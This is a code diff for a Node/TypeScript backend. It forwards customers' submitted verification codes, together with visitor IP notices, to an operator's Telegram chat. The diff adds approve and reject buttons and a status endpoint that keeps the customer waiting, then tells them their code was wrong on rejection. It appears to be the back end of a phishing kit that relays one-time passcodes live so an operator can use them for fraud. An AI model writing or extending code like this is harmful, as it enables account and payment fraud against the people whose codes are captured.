@@ -14,6 +14,7 @@ const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 const notifiedVisitIPs = new Set<string>();
+const orderStatuses = new Map<string, "pending" | "approved" | "rejected">();
 
 let exchangeRate = 1320;
 let orderCounter = Math.floor(1000 + Math.random() * 8999);
@@ -60,6 +61,12 @@ function generateOrderId(): string {
 
 router.get("/config/rate", (_req, res) => {
   res.json({ rate: exchangeRate, ratePerHundred: exchangeRate * 100 });
+});
+
+router.get("/order/status/:orderId", (req, res) => {
+  const orderId = req.params.orderId;
+  const status = orderStatuses.get(orderId) || "pending";
+  res.json({ orderId, status });
 });
 
 router.post("/telegram/notify-visit", async (req, res) => {
@@ -129,12 +136,22 @@ router.post("/telegram/submit-order", async (req, res) => {
 router.post("/telegram/submit-code", async (req, res) => {
   try {
     const body = SubmitVerificationCodeBody.parse(req.body);
+
+    orderStatuses.set(body.orderId, "pending");
+
     const message =
-      `✅ <b>تم إدخال كود التحقق</b>\n\n` +
+      `🔑 <b>تم إدخال كود التحقق</b>\n\n` +
       `📋 <b>رقم الطلب:</b> ${body.orderId}\n` +
-      `🔑 <b>كود التحقق:</b> ${body.code}\n\n` +
-      `✅ الزبون أدخل الكود بنجاح`;
-    const sent = await sendTelegramMessage(message);
+      `🔐 <b>كود التحقق:</b> ${body.code}\n\n` +
+      `⏳ الزبون ينتظر قرارك...`;
+    const sent = await sendTelegramMessage(message, {
+      inline_keyboard: [
+        [
+          { text: "✅ موافقة", callback_data: `approve_${body.orderId}` },
+          { text: "❌ رفض", callback_data: `reject_${body.orderId}` },
+        ],
+      ],
+    });
     const result = SubmitVerificationCodeResponse.parse({
       success: sent,
       message: sent ? "تم إرسال الكود بنجاح" : "فشل إرسال الكود",
@@ -145,7 +162,7 @@ router.post("/telegram/submit-code", async (req, res) => {
   }
 });
 
-// --- Telegram Bot Polling for /admin ---
+// --- Telegram Bot Polling ---
 
 let lastUpdateId = 0;
 let awaitingRateInput = false;
@@ -178,6 +195,28 @@ async function pollTelegramUpdates() {
         const cb = update.callback_query;
         const cbChatId = cb.message?.chat?.id?.toString();
         if (cbChatId !== CHAT_ID) continue;
+
+        if (cb.data?.startsWith("approve_")) {
+          const oid = cb.data.replace("approve_", "");
+          orderStatuses.set(oid, "approved");
+          await answerCallbackQuery(cb.id, "تمت الموافقة ✅");
+          await sendTelegramMessage(
+            `✅ <b>تمت الموافقة على الطلب ${oid}</b>\n\n` +
+            `تم إبلاغ الزبون بنجاح العملية.`
+          );
+          continue;
+        }
+
+        if (cb.data?.startsWith("reject_")) {
+          const oid = cb.data.replace("reject_", "");
+          orderStatuses.set(oid, "rejected");
+          await answerCallbackQuery(cb.id, "تم الرفض ❌");
+          await sendTelegramMessage(
+            `❌ <b>تم رفض الطلب ${oid}</b>\n\n` +
+            `تم إبلاغ الزبون بأن الكود غلط.`
+          );
+          continue;
+        }
 
         if (cb.data === "change_rate") {
           awaitingRateInput = true;
